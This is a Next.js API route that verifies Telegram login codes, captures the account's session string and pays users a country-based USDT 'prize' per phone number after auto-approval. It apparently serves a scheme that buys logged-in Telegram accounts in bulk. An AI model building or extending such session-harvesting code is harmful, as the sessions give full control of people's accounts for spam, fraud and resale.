import { NextRequest, NextResponse } from 'next/server'
import { verifyOTP } from '@/lib/telegram/auth'
import { getDb } from '@/lib/mongodb/connection'

/**
 * POST /api/telegram/auth/verify-otp
 * Verify OTP and create session
 */
export async function POST(request: NextRequest) {
  try {
    // Parse request body with error handling
    let body
    try {
      body = await request.json()
    } catch (parseError) {
      console.error('[VerifyOTP] Failed to parse request body:', parseError)
      return NextResponse.json(
        { success: false, error: 'Invalid request format' },
        { status: 400 }
      )
    }

    const { phoneNumber, phoneCodeHash, otpCode, sessionString, telegramId } = body

    if (!phoneNumber || !phoneCodeHash || !otpCode) {
      return NextResponse.json(
        { success: false, error: 'Phone number, code hash, and OTP are required' },
        { status: 400 }
      )
    }

    // Validate OTP format
    if (!/^\d{5}$/.test(otpCode)) {
      return NextResponse.json(
        { success: false, error: 'OTP must be 5 digits' },
        { status: 400 }
      )
    }

    console.log(`[VerifyOTP] Verifying OTP for: ${phoneNumber}`)

    const result = await verifyOTP(phoneNumber, phoneCodeHash, otpCode, sessionString)

    if (result.success) {
      // Create or update account record in database
      if (telegramId) {
        try {
          const db = await getDb()
          
          // Get user from database
          const user = await db.collection('users').findOne({ telegram_id: telegramId })
          
          if (user) {
            // Check if account already exists
            const existingAccount = await db.collection('accounts').findOne({
              user_id: user._id,
              phone_number: phoneNumber
            })

            if (existingAccount) {
              console.log(`[VerifyOTP] Account exists, checking auto-approve...`)
              
              // Detect country from phone number
              let autoApproveMinutes = 1440 // Default (24 hours in minutes)
              
              // Extract country code from phone number (e.g., +1234567890 -> try 1, 12, 123, 1234)
              const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
              let countryFound = false
              
              for (let i = 1; i <= Math.min(4, phoneDigits.length) && !countryFound; i++) {
                const possibleCode = phoneDigits.substring(0, i)
                const country = await db.collection('country_capacity').findOne({ 
                  country_code: possibleCode 
                })
                
                if (country) {
                  autoApproveMinutes = country.auto_approve_minutes ?? 1440
                  console.log(`[VerifyOTP] Country found: ${country.country_name}, auto-approve: ${autoApproveMinutes}min`)
                  countryFound = true
                }
              }
              
              if (!countryFound) {
                // Fallback to global setting
                const settings = await db.collection('settings').findOne({ setting_key: 'auto_approve_minutes' })
                autoApproveMinutes = parseInt(settings?.setting_value || '1440')
                console.log(`[VerifyOTP] No country match, using global setting: ${autoApproveMinutes}min`)
              }
              
              // Calculate time difference
              const now = new Date()
              const createdAt = existingAccount.created_at
              const minutesPassed = (now.getTime() - createdAt.getTime()) / (1000 * 60)
              
              console.log(`[VerifyOTP] Minutes since creation: ${minutesPassed.toFixed(2)}, Auto-approve after: ${autoApproveMinutes}`)
              
              // Auto-approve if time has passed and status is still pending
              if (minutesPassed >= autoApproveMinutes && existingAccount.status === 'pending') {
                await db.collection('accounts').updateOne(
                  { _id: existingAccount._id },
                  { 
                    $set: { 
                      status: 'accepted',
                      approved_at: new Date(),
                      auto_approved: true,
                      updated_at: new Date()
                    }
                  }
                )
                
                // Add prize amount to user balance
                if (existingAccount.amount && existingAccount.amount > 0) {
                  await db.collection('users').updateOne(
                    { _id: user._id },
                    { $inc: { balance: existingAccount.amount } }
                  )
                  console.log(`[VerifyOTP] ✅ Account auto-approved after ${minutesPassed.toFixed(2)} minutes, added $${existingAccount.amount} to balance`)
                } else {
                  console.log(`[VerifyOTP] ✅ Account auto-approved after ${minutesPassed.toFixed(2)} minutes (no prize amount)`)
                }
              }
            } else {
              // Get prize amount from country
              let prizeAmount = 0
              let countryName = 'Unknown'
              const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
              
              console.log(`[VerifyOTP] 🔍 Detecting country for ${phoneNumber} (digits: ${phoneDigits})`)
              
              for (let i = 1; i <= Math.min(4, phoneDigits.length); i++) {
                const possibleCode = phoneDigits.substring(0, i)
                console.log(`[VerifyOTP] Trying country code: ${possibleCode}`)
                const country = await db.collection('country_capacity').findOne({ 
                  country_code: possibleCode 
                })
                
                if (country) {
                  prizeAmount = country.prize_amount || 0
                  countryName = country.country_name
                  console.log(`[VerifyOTP] ✅ Country found: ${country.country_name}, Code: ${possibleCode}, Prize: $${prizeAmount}`)
                  break
                }
              }
              
              if (prizeAmount === 0) {
                console.log(`[VerifyOTP] ⚠️ No country found or prize is $0 for ${phoneNumber}`)
              }
              
              // Insert new account record with pending status
              await db.collection('accounts').insertOne({
                user_id: user._id,
                phone_number: phoneNumber,
                amount: prizeAmount,
                status: 'pending',
                created_at: new Date()
              })
              
              console.log(`[VerifyOTP] 💰 Account created: ${phoneNumber} | Status: PENDING | Prize: $${prizeAmount} USDT (${countryName})`)
            }
          }
        } catch (dbError) {
          console.error('[VerifyOTP] Database error:', dbError)
        }
      }
      
      return NextResponse.json({
        success: true,
        sessionString: result.sessionString,
        userId: result.userId,
        message: 'Login successful! Session created.',
      })
    } else if (result.requires2FA || result.error === '2FA_REQUIRED') {
      return NextResponse.json({
        success: false,
        requires2FA: true,
        sessionString: result.sessionString, // Pass partial session for 2FA step
        error: 'Two-factor authentication required',
        message: 'Please enter your 2FA password',
      })
    } else {
      return NextResponse.json(
        { success: false, error: result.error },
        { status: 400 }
      )
    }
  } catch (error: any) {
    console.error('[VerifyOTP] Error:', error)
    return NextResponse.json(
      { success: false, error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}
